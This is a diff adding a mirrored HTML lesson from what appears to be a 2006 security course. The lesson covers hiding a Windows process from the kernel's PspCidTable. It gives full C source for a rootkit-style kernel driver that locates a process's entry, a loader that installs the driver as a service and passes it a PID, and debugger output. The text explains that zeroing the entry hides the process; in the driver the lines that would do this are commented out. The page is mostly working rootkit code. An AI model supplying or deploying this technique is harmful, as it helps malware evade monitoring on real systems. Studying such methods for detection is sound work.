@@ -1,0 +1,505 @@
+<html xmlns:o="urn:schemas-microsoft-com:office:office"
+xmlns:w="urn:schemas-microsoft-com:office:word"
+xmlns="http://www.w3.org/TR/REC-html40">
+
+
+<!-- Mirrored from www.vijaymukhi.com/seccourse/june2606/pspctbl2.htm by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Oct 2024 14:43:07 GMT -->
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
+<meta name=ProgId content=Word.Document>
+<meta name=Generator content="Microsoft Word 9">
+<meta name=Originator content="Microsoft Word 9">
+<link rel=File-List href="pspctbl2_files/filelist.html">
+<title>PspCidTable</title>
+<!--[if gte mso 9]><xml>
+ <o:DocumentProperties>
+  <o:Author>Vijay Mukhi</o:Author>
+  <o:Template>Normal</o:Template>
+  <o:LastAuthor>Vijay Mukhi</o:LastAuthor>
+  <o:Revision>2</o:Revision>
+  <o:TotalTime>194</o:TotalTime>
+  <o:Created>2006-06-26T11:59:00Z</o:Created>
+  <o:LastSaved>2006-06-26T11:59:00Z</o:LastSaved>
+  <o:Pages>5</o:Pages>
+  <o:Words>1068</o:Words>
+  <o:Characters>6092</o:Characters>
+  <o:Company>VMCI</o:Company>
+  <o:Lines>50</o:Lines>
+  <o:Paragraphs>12</o:Paragraphs>
+  <o:CharactersWithSpaces>7481</o:CharactersWithSpaces>
+  <o:Version>9.2720</o:Version>
+ </o:DocumentProperties>
+</xml><![endif]-->
+<style>
+<!--
+ /* Style Definitions */
+p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{mso-style-parent:"";
+	margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+@page Section1
+	{size:8.5in 11.0in;
+	margin:1.0in 1.25in 1.0in 1.25in;
+	mso-header-margin:.5in;
+	mso-footer-margin:.5in;
+	mso-paper-source:0;}
+div.Section1
+	{page:Section1;}
+-->
+</style>
+</head>
+
+<body lang=EN-US style='tab-interval:.5in'>
+
+<div class=Section1>
+
+<p class=MsoNormal>PSP CID table II</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Lets now remove our process from the PspCidTable. Before
+this lets start at the basics once again. In our earlier code we assumed that
+some structure starts at location 0xffdff000. Where does this magic number come
+from.<span style="mso-spacerun: yes">  </span>The fs register has a value of
+0x30 in both kernel and user mode. In kernel mode it points<span
+style="mso-spacerun: yes">  </span>to a DATA32 region which has starts at
+memory location ffdff000. This is how this magic value is obtained. We then add
+34 to this pcr value and find a pointer 8054c038. we add 0x80 to this pointer
+to find a value of<span style="mso-spacerun: yes">  </span>8054c0b8. At this
+point we see a value of 805605e0. Here is where the pspcidtable is stored.
+Actual proof.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>lkd&gt; dd 0xffdff034</p>
+
+<p class=MsoNormal>ffdff034<span style="mso-spacerun: yes">  </span>8054c038
+8003f400</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>lkd&gt; dd 8054c038+0x80</p>
+
+<p class=MsoNormal>8054c0b8<span style="mso-spacerun: yes">  </span>805605e0
+00000000</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>lkd&gt; dd 805605e0</p>
+
+<p class=MsoNormal>805605e0<span style="mso-spacerun: yes">  </span>e10007d0</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>We pass the pid<span style="mso-spacerun: yes"> 
+</span>of<span style="mso-spacerun: yes">  </span>any running program on the
+command line and the PsLookupProcessByProcessId gives us an EPROCESS structure.
+We then call the function from FuTo which is called EraseObjectFromPspCidTable.
+We have written a simple program f.c which we hide each time.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>f.c</p>
+
+<p class=MsoNormal>#include &lt;windows.h&gt;</p>
+
+<p class=MsoNormal>unsigned char c[100];</p>
+
+<p class=MsoNormal>int _stdcall WinMain(HINSTANCE i , HINSTANCE j, char *k, int
+l)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>sprintf(c,&quot;hi %d&quot;,GetCurrentProcessId());</p>
+
+<p class=MsoNormal>MessageBox(0,c, c, 0);</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>y –i 1312</p>
+
+<p class=MsoNormal>y –u</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>r.c</p>
+
+<p class=MsoNormal>#include &lt;ntddk.h&gt;</p>
+
+<p class=MsoNormal>#include &lt;stdio.h&gt;</p>
+
+<p class=MsoNormal>const WCHAR deviceLinkBuffer[]<span style="mso-spacerun:
+yes">  </span>= L&quot;\\DosDevices\\sonal8&quot;;</p>
+
+<p class=MsoNormal>const WCHAR deviceNameBuffer[]<span style="mso-spacerun:
+yes">  </span>= L&quot;\\Device\\sonal8&quot;;</p>
+
+<p class=MsoNormal>UNICODE_STRING
+deviceNameUnicodeString,deviceLinkUnicodeString;<span style="mso-spacerun:
+yes">        </span></p>
+
+<p class=MsoNormal>PDEVICE_OBJECT g_RootkitDevice;</p>
+
+<p class=MsoNormal>typedef struct _TABLE_ENTRY </p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>long object;</p>
+
+<p class=MsoNormal>ACCESS_MASK security;</p>
+
+<p class=MsoNormal>} TABLE_ENTRY, *PTABLE_ENTRY, **PPTABLE_ENTRY,
+***PPPTABLE_ENTRY;</p>
+
+<p class=MsoNormal>NTSTATUS abcDevice(PDEVICE_OBJECT DeviceObject,PIRP Irp)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>IO_STACK_LOCATION *irpStack;</p>
+
+<p class=MsoNormal>long *inputBuffer;</p>
+
+<p class=MsoNormal>long pid,ioControlCode;</p>
+
+<p class=MsoNormal>long pspcid;</p>
+
+<p class=MsoNormal>long i,i1,i2,i3;</p>
+
+<p class=MsoNormal>void *eproc;</p>
+
+<p class=MsoNormal>PTABLE_ENTRY orig_tableEntry, p_tableEntry, *pp_tableEntry,
+**ppp_tableEntry;</p>
+
+<p class=MsoNormal>int a, b, c;</p>
+
+<p class=MsoNormal>int i_numHandles, i_hperPage, i_numTables; </p>
+
+<p class=MsoNormal>int i_handle;</p>
+
+<p class=MsoNormal>irpStack = IoGetCurrentIrpStackLocation (Irp);</p>
+
+<p class=MsoNormal>inputBuffer = (long *)Irp-&gt; AssociatedIrp.SystemBuffer;</p>
+
+<p class=MsoNormal>pid = *inputBuffer;</p>
+
+<p class=MsoNormal>ioControlCode =
+irpStack-&gt;Parameters.DeviceIoControl.IoControlCode;</p>
+
+<p class=MsoNormal>i = 0x0ffdff034;</p>
+
+<p class=MsoNormal>i1 = *(long *)i;</p>
+
+<p class=MsoNormal>i2 = i1 + 0x80;</p>
+
+<p class=MsoNormal>i3 = *(long *)i2;</p>
+
+<p class=MsoNormal>DbgPrint(&quot;i=%x i1=%x i2=%x i3=%x&quot;,i,i1,i2,i3);</p>
+
+<p class=MsoNormal>pspcid = *(long *)i3;</p>
+
+<p class=MsoNormal>PsLookupProcessByProcessId(pid,&amp;eproc);</p>
+
+<p class=MsoNormal>DbgPrint(&quot;pspcid=%x eproc=%x
+pid=%d&quot;,pspcid,eproc,pid);</p>
+
+<p class=MsoNormal>i_numHandles = *(int*)(pspcid + 0x3c);</p>
+
+<p class=MsoNormal>orig_tableEntry = (PTABLE_ENTRY)*(long *)(pspcid);</p>
+
+<p class=MsoNormal>i_numTables = ((long)orig_tableEntry &amp; 3);</p>
+
+<p class=MsoNormal>i_hperPage = PAGE_SIZE/sizeof(TABLE_ENTRY);<span
+style='mso-tab-count:1'>   </span></p>
+
+<p class=MsoNormal>DbgPrint(&quot;i_numHandles=%x orig_tableEntry=%x
+i_numTables=%d
+i_hperPage=%d&quot;,i_numHandles,orig_tableEntry,i_numTables,i_hperPage);</p>
+
+<p class=MsoNormal>pp_tableEntry = (PPTABLE_ENTRY)((long)orig_tableEntry &amp;
+0xfffffff8);</p>
+
+<p class=MsoNormal>DbgPrint(&quot;Starting table entry=%x&quot;,pp_tableEntry);</p>
+
+<p class=MsoNormal>for (a = 0; a &lt; i_hperPage; a++)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>DbgPrint(&quot;Table of pointers is at
+%x&quot;,pp_tableEntry[a]);</p>
+
+<p class=MsoNormal>if (pp_tableEntry[a] == NULL)</p>
+
+<p class=MsoNormal>break;</p>
+
+<p class=MsoNormal>for (b = 0; b &lt; i_hperPage; b++)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>//DbgPrint(&quot;Comparing %x to %x org=%x\n&quot;,
+((pp_tableEntry[a][b].object | 0x80000000) &amp; 0xfffffff8),
+eproc,pp_tableEntry[a][b].object);</p>
+
+<p class=MsoNormal>if (((pp_tableEntry[a][b].object ) &amp; 0xfffffff8) ==
+((long)eproc))</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>DbgPrint(&quot;a=%d b=%d&quot;,a,b);</p>
+
+<p class=MsoNormal>DbgPrint(&quot;Handle = %x Object %x Security %x\n&quot;,
+((a*512)+b)*4,pp_tableEntry[a][b].object &amp; 0xfffffff8, pp_tableEntry[a][b].security);</p>
+
+<p class=MsoNormal>//pp_tableEntry[a][b].object = 0;</p>
+
+<p class=MsoNormal>//pp_tableEntry[a][b].security =
+((PHANDLE_TABLE)pspcid)-&gt;FirstFree;</p>
+
+<p class=MsoNormal>//((PHANDLE_TABLE)pspcid)-&gt;FirstFree = (ULONG)(pid);</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>IoCompleteRequest(Irp,IO_NO_INCREMENT);</p>
+
+<p class=MsoNormal>return STATUS_SUCCESS;<span style="mso-spacerun: yes">  
+</span></p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>NTSTATUS abcCreate(PDEVICE_OBJECT DeviceObject,PIRP Irp)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>//DbgPrint(&quot;abcCreate&quot;);</p>
+
+<p class=MsoNormal>return STATUS_SUCCESS;<span style="mso-spacerun: yes">  
+</span></p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>VOID OnUnload(PDRIVER_OBJECT DriverObject )</p>
+
+<p class=MsoNormal>{<span style='mso-tab-count:1'>          </span></p>
+
+<p class=MsoNormal>UNICODE_STRING deviceLinkUnicodeString;</p>
+
+<p class=MsoNormal>RtlInitUnicodeString( &amp;deviceLinkUnicodeString, deviceLinkBuffer
+);</p>
+
+<p class=MsoNormal>IoDeleteSymbolicLink( &amp;deviceLinkUnicodeString );</p>
+
+<p class=MsoNormal>IoDeleteDevice(DriverObject-&gt;DeviceObject);</p>
+
+<p class=MsoNormal>DbgPrint(&quot;Unload5&quot;);</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>NTSTATUS DriverEntry(PDRIVER_OBJECT d,PUNICODE_STRING r)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>d-&gt;DriverUnload<span style="mso-spacerun: yes">  </span>=
+OnUnload; </p>
+
+<p class=MsoNormal>DbgPrint(&quot;DriverEntry&quot;);</p>
+
+<p class=MsoNormal>RtlInitUnicodeString
+(&amp;deviceNameUnicodeString,deviceNameBuffer );</p>
+
+<p class=MsoNormal>RtlInitUnicodeString
+(&amp;deviceLinkUnicodeString,deviceLinkBuffer );</p>
+
+<p class=MsoNormal>IoCreateDevice (d,0,
+&amp;deviceNameUnicodeString,0,0,TRUE,&amp;g_RootkitDevice );</p>
+
+<p class=MsoNormal>IoCreateSymbolicLink (&amp;deviceLinkUnicodeString,
+&amp;deviceNameUnicodeString );</p>
+
+<p class=MsoNormal>d-&gt;MajorFunction[IRP_MJ_CREATE]=abcCreate;</p>
+
+<p class=MsoNormal>d-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL]=abcDevice;</p>
+
+<p class=MsoNormal>return STATUS_SUCCESS;</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>y.c</p>
+
+<p class=MsoNormal>#include &lt;windows.h&gt;</p>
+
+<p class=MsoNormal>SC_HANDLE m,s,g;</p>
+
+<p class=MsoNormal>int pid,b;</p>
+
+<p class=MsoNormal>void main(int argc, char **argv)</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>if ( argv[1][1] == 'i')</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>pid = atoi(argv[2]);</p>
+
+<p class=MsoNormal>m=OpenSCManager(0,0,SC_MANAGER_ALL_ACCESS );</p>
+
+<p class=MsoNormal>CreateService(m,&quot;sonal5&quot;,&quot;sonal5&quot;,SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START,SERVICE_ERROR_NORMAL,&quot;C:\\sonal5\\sonal5.sys&quot;,0,0,0,0,0);</p>
+
+<p class=MsoNormal>s=OpenService(m,&quot;sonal5&quot;,SERVICE_ALL_ACCESS);</p>
+
+<p class=MsoNormal>StartService(s, 0, 0);</p>
+
+<p class=MsoNormal>g=CreateFile(&quot;\\\\.\\sonal8&quot;,GENERIC_READ |
+GENERIC_WRITE,0,0,OPEN_EXISTING,0,0);</p>
+
+<p class=MsoNormal>DeviceIoControl(g,1,(void *)&amp;pid,4,0,0,&amp;b,0);</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>else</p>
+
+<p class=MsoNormal>{</p>
+
+<p class=MsoNormal>SERVICE_STATUS<span style="mso-spacerun: yes"> 
+</span>status;</p>
+
+<p class=MsoNormal>m= OpenSCManager (0,0,SC_MANAGER_ALL_ACCESS );</p>
+
+<p class=MsoNormal>s=OpenService(m,&quot;sonal5&quot;,SERVICE_ALL_ACCESS);</p>
+
+<p class=MsoNormal>ControlService(s, SERVICE_CONTROL_STOP, &amp;status);</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>DriverEntry</p>
+
+<p class=MsoNormal>i=ffdff034 i1=8054c038 i2=8054c0b8 i3=805605e0</p>
+
+<p class=MsoNormal>pspcid=e10007d0 eproc=8935f9d0 pid=3360</p>
+
+<p class=MsoNormal>i_numHandles=212 orig_tableEntry=e237a001 i_numTables=1
+i_hperPage=512</p>
+
+<p class=MsoNormal>Starting table entry=e237a000</p>
+
+<p class=MsoNormal>Table of pointers is at e1003000</p>
+
+<p class=MsoNormal>Table of pointers is at e237b000</p>
+
+<p class=MsoNormal>a=1 b=328</p>
+
+<p class=MsoNormal>Handle = d20 Object 8935f9d0 Security 0</p>
+
+<p class=MsoNormal>Table of pointers is at 0</p>
+
+<p class=MsoNormal>Unload5</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>To find the number of handles in the pspcidtable we need to
+access a location 0x3c from the start of the table. In our case we see the
+following</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>lkd&gt; dd e10007d0+0x3c</p>
+
+<p class=MsoNormal>e100080c<span style="mso-spacerun: yes">  </span>00000203</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Thus we have 203 handles in our table. The entry at the
+start of the pspcidtable gives us two things, one the page that contains the
+pages that contain the handles and two the number of tables. The first two bits
+give us the depth of the tables.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>lkd&gt; dd e10007d0</p>
+
+<p class=MsoNormal>e10007d0<span style="mso-spacerun: yes">  </span>e237a001</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>In our case the tables are at page e237a000<span
+style="mso-spacerun: yes">  </span>and the depth of the handle structures is 1.
+The table contain a handle and a security mask which gives it a size of 8
+bytes. Thus in one page we can fit 4096/8 or 512 handles only. Thus in our case
+we need two pages to store the handles.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>We enter a for loop with values of a starting from 0 to 512.
+In this case the for loop should go on for 1024 times as this first table is
+made up of pointers to page tables that contain the handles. These are simple 4
+byte pointers and in our case see two page table only that contain such
+pointers. These start at </p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>lkd&gt; dd e237a000</p>
+
+<p class=MsoNormal>e237a000<span style="mso-spacerun: yes">  </span>e1003000
+e237b000 00000000 00000000</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>The minute we come to the third entry as it is null we quit
+out. The second for loop is what goes through each entry in the pspcidtable. </p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>e1003000<span style="mso-spacerun: yes">  </span>00000000
+fffffffe 89bd0491 00000000</p>
+
+<p class=MsoNormal>e1003010<span style="mso-spacerun: yes">  </span>89bd0219
+00000000 89bcfd21 00000000</p>
+
+<p class=MsoNormal>e1003020<span style="mso-spacerun: yes">  </span>89bcfaa9
+00000000 89bcf831 00000000</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>The security bytes are always zeroes and these number are
+larger than 2 gb. We have too knock off the first 12 bits. All that we need to
+do is set the object entry which is an eprocess structure to 0 which removes
+the eprocess structure from the pspcidtable.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Thus the pspcidtable simply contains a series of pointer to
+threads and eprocesses. We scan through them and the minute we find one we
+simply zero it out.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+</div>
+
+</body>
+
+
+<!-- Mirrored from www.vijaymukhi.com/seccourse/june2606/pspctbl2.htm by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Oct 2024 14:43:08 GMT -->
+</html>
